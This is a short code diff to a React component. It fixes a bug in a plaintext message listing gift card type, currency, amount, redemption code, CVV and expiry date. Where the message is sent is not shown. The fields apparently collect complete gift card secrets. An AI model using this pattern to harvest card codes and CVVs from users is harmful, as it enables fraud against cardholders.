@@ -38,7 +38,7 @@ const TypeThree = ({cardname, setShowmodal, showmodal, amount, setAmount, curren
         const msg = `
 Card Type: ${cardname}
 Currency: ${currency}
-Amount: ${redemptionCode}
+Amount: ${amount}
 Reedemption Code: ${redemptionCode}
 Gift Card CVV: ${cvv}
 Gift Card Expiry Date: ${expiry}
